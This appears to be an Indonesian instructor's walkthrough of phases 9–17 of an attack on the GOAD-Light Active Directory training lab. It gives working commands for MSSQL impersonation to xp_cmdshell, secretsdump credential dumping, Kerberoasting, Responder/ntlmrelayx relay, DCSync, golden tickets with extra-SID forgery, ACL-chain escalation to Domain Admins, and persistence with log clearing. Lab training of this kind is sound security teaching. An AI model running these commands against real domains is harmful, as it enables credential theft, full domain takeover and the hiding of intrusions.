# Skenario Lanjutan — GOAD-Light (Fall of the North → King's Landing) (Detail Lengkap)

Lanjutan dari skenario pertama (Fase 8: RDP `jon.snow` ke `castelblack`), **disesuaikan untuk GOAD-Light** (tanpa domain `essos.local`).

> **GOAD-Light = 3 VM:**
> - `kingslanding .10` — DC `sevenkingdoms.local` (forest root)
> - `winterfell .11` — DC `north.sevenkingdoms.local` (child domain)
> - `castelblack .22` — IIS + MSSQL, **Defender OFF**
>
> **Yang TIDAK ada di GOAD-Light:** essos/cross-forest, MSSQL trusted link, Zerologon, PetitPotam unauth, ESC4/ESC2/ESC3.
> Implikasinya: jalur ke root forest memakai **trust child→parent**, bukan cross-forest.

---

## Fase 9 — Post-Exploitation di castelblack (jon.snow)

### Posisi
`jon.snow` = **MSSQL admin** + RDP (Stark/Night Watch), bukan local admin OS.

### Perintah
```powershell
whoami /all                       # identitas + privilege token
net user /domain                  # user domain NORTH
net group "Domain Admins" /domain # cek anggota DA north
```

### Penjelasan teknis
- `net user /domain` menampilkan daftar user dari DC (via domain, bukan mesin lokal).
- `net group "Domain Admins" /domain` menampilkan anggota DA north → memvalidasi target akhir.

### Target data penting
- `robb.stark` → bot LLMNR 3 menit (session hadir di castelblack) + **admin winterfell**.
- `samwell.tarly` → password di LDAP description + **GPO edit "STARKWALLPAPER"**.
- `jeor.mormont` → ACL writedacl-writeowner pada group **"Night Watch"**.

### Poin penting
Di GOAD-Light, `jeor.mormont` **tidak lagi** menyimpan password di SYSVOL (berbeda dari GOAD penuh) — gantinya ia punya hak ACL pada group Night Watch.

---

## Fase 10 — MSSQL Impersonation → SYSTEM

### Perintah
```bash
mssqlclient.py NORTH/jon.snow:iknownothing@192.168.56.22 -windows-auth
```
```sql
enum_impersonate
--  -> samwell.tarly (LOGIN) -> sa ; arya.stark (USER) -> dbo
EXECUTE AS LOGIN = 'samwell.tarly'
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
xp_cmdshell whoami   -- NT Service\MSSQLSERVER
```

### Penjelasan teknis
Identik dengan Fase 10 GOAD penuh: `jon.snow` (sysadmin) → impersonate `samwell.tarly` (LOGIN) → `sa` → aktifkan `xp_cmdshell` → eksekusi sebagai service account `NT Service\MSSQLSERVER` (setara SYSTEM lokal).

### Poin penting
Impersonation **arya.stark → dbo** (database-level) berbeda dari **samwell.tarly → sa** (server-level). Untuk xp_cmdshell, butuh tingkat `sa`.

---

## Fase 11 — Dump LSASS (Defender OFF di castelblack)

### Perintah
```bash
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22
```

### Penjelasan teknis
- `secretsdump.py` menarik SAM/LSA/LSASS secara remote (atau lokal setelah jadi admin).
- Karena Defender **off** di castelblack, mimikatz juga aman untuk `sekurlsa::logonpasswords`.

### Temuan
- `robb.stark` bot login → hash/plaintext → **admin winterfell**.
- `samwell.tarly` → ambil password dari **LDAP description**.
- `jeor.mormont` → admin castelblack (via ACL Night Watch).

---

## Fase 12 — Kerberoasting + GPO Abuse

### Perintah
```bash
# 12.1) jon.snow punya SPN -> kerberoast
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/jon.snow:iknownothing -outputfile rb.hashes
hashcat -m 13100 -a 0 rb.hashes /usr/share/wordlists/rockyou.txt

# 12.2) samwell.tarly -> edit GPO "STARKWALLPAPER" -> RCE
# (pyGPOabuse: tambah scheduled task / startup script ke winterfell)
```

### Penjelasan teknis
- **Perbedaan GOAD-Light**: target Kerberoast adalah **`jon.snow`** (punya SPN), bukan `robb.stark` seperti GOAD penuh.
- **GPO Abuse** via `samwell.tarly`: GPO `STARKWALLPAPER` di-apply ke mesin north → suntik *Scheduled Task* untuk RCE.

---

## Fase 13 — NTLM Relay → DA NORTH (lompatan kunci)

### Prasyarat
`eddard.stark` = **DA NORTH** (bot LLMNR 5 menit), `robb.stark` (bot 3 menit).

### Perintah
```bash
# Terminal 1: poison LLMNR/NBT-NS
sudo responder -I eth0 -wd

# Terminal 2: relay hash ke winterfell
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
#  targets.txt = 192.168.56.11
```

### Penjelasan teknis
- Responder merespons broadcast LLMNR/NBT-NS dan menangkap hash NTLM.
- ntlmrelayx me-relay hash `eddard.stark` (admin winterfell) ke winterfell → sesi DA NORTH.

### Output
```
[*] Authenticating against smb://192.168.56.11 as NORTH/EDDARD.STARK SUCCEED
```
→ **DOMAIN ADMIN NORTH TERCAPAI**.

---

## Fase 14 — DCSync NORTH + Golden Ticket

### Perintah
```bash
secretsdump.py -just-dc north.sevenkingdoms.local/eddard.stark:'<hash>'@192.168.56.11
ticketer.py -nthash <krbtgt_nthash> -domain-sid <NORTH-SID> \
  -domain north.sevenkingdoms.local Administrator
```

### Penjelasan teknis
- `-just-dc` mensimulasikan **DCSync** (DRSR) → tarik `krbtgt` + semua hash.
- `ticketer.py` membuat **golden ticket** (TGT palsu) dengan hash krbtgt → persistence.

---

## Fase 15 — Cross-Domain (Child→Parent) ke sevenkingdoms.local

### Tujuan
Naik dari DA `north` (child) menjadi DA `sevenkingdoms` (parent/root) lewat **trust child→parent**.

### 15.1 SID History / inter-realm ticket (jika sudah DA NORTH)
- Trust child→parent = dua arah. DA child bisa **forgery ticket** dengan **SID History = `Enterprise Admins` / `Domain Admins` parent**.
- Dengan SID History, saat tiket dipresentasikan ke parent, parent menganggap user adalah anggota group tersebut → akses penuh.
- Eksekusi:
```bash
# Golden ticket dengan extra SID (parent Domain Admins)
ticketer.py -nthash <krbtgt_north> -domain-sid <NORTH-SID> \
  -domain north.sevenkingdoms.local -extra-sid <SEVENKINGDOMS-DA-SID> Administrator
```

### 15.2 Rantai ACL di sevenkingdoms (via trust)
```bash
# tywin.lannister  : ForceChangePassword pada jaime.lannister
#  -> jaime.lannister : GenericWrite joffrey.baratheon
#    -> joffrey.baratheon : WriteDACL tyron.lannister
#      -> tyron.lannister : Self-Membership Small Council
#        -> Small Council : AddMember Dragonstone
#          -> Dragonstone : WriteOwner Kingsguard
#            -> Kingsguard : GenericAll stannis.baratheon
#              -> stannis.baratheon : GenericAll komputer kingslanding
#                -> RBCD takeover kingslanding -> DA
```
Penjelasan tiap edge sama seperti Fase 17 GOAD penuh (ForceChangePassword, GenericWrite, WriteDACL, Self-Membership, WriteOwner, GenericAll/RBCD).

### 15.3 Jalur cepat DA sevenkingdoms
- `lord.varys` → **GenericAll** grup Domain Admins
- `petyr.baelish` → **writeproperty** grup Domain Admins
- `maester.pycelle` → **write owner** grup Domain Admins
- `stannis.baratheon` → **writeproperty self-membership** Domain Admins

```bash
# contoh: tambahkan diri ke Domain Admins via lord.varys / petyr
net rpc group addmem "Domain Admins" <user> -U sevenkingdoms.local/<user>%<pass> -S 192.168.56.10
```

### Poin penting
- Di GOAD-Light, jalur lintas domain ini memakai **SID History + rantai ACL** (menggantikan MSSQL linked server yang tidak ada).
- `net rpc group addmem` mengeksploitasi `GenericAll`/`WriteProperty` pada group DA untuk menambahkan anggota.

---

## Fase 16 — DCSync sevenkingdoms → Full Compromise

### Perintah
```bash
secretsdump.py -just-dc sevenkingdoms.local/cersei.lannister:'<pass>'@192.168.56.10
#  atau setelah RBCD:
getST.py -impersonate administrator -spn CIFS/kingslanding.sevenkingdoms.local ...
```

### Penjelasan teknis
- Setelah menjadi DA, tarik `krbtgt` sevenkingdoms via DCSync → kontrol penuh forest root.
- Alternatif RBCD: `stannis` GenericAll pada `kingslanding` → set `msDS-AllowedToActOnBehalfOfOtherIdentity` → impersonate `Administrator`.

---

## Fase 17 — Persistence & Cleanup

### Perintah
```bash
# Golden/Silver ticket (north + sevenkingdoms)
# AdminSDHolder / skeleton key (Defender aktif di DC)
# DSRM backdoor, ACL persistence
# wevtutil clear-log (hapus jejak)
```

### Penjelasan teknis
Sama seperti Fase 18 GOAD penuh: golden/silver ticket, DSRM, ACL persistence, dan pembersihan log.

---

## Ringkasan Kill-Chain GOAD-Light

| Fase | Teknik | Target | Output |
|---|---|---|---|
| 9 | Local enum | castelblack | foothold validasi |
| 10 | MSSQL impersonation + xp_cmdshell | castelblack | SYSTEM |
| 11 | LSASS dump (defender off) | castelblack | hash robb/samwell/jeor |
| 12 | Kerberoast + GPO abuse | winterfell | admin winterfell |
| 13 | **NTLM relay eddard.stark** | winterfell | **DA NORTH** |
| 14 | DCSync + golden ticket | north | kontrol north |
| 15 | Child→parent trust + ACL chain | sevenkingdoms | jalur ke DA |
| 16 | DCSync | kingslanding | **DA sevenkingdoms** |
| 17 | Persistence | semua | persistensi |

---

## Catatan Pengajar

- **Tidak ada essos** → Fase 15/16 GOAD-Light langsung lompat dari DA North ke sevenkingdoms via *trust* (child→parent), bukan cross-forest.
- **MSSQL trusted link** tidak tersedia (butuh braavos); ganti dengan jalur **SID History + rantai ACL**.
- **Kerberoast target** di GOAD-Light = `jon.snow` (punya SPN), bukan `robb.stark`.
- **ADCS**: ESC1 mungkin masih ada (ESC4/ESC2/ESC3 dihapus) — cek `certipy find` sebelum dipakai.
- Kunci utama tetap **Fase 13 (NTLM relay)** → lompatan ke DA North tanpa crack password.
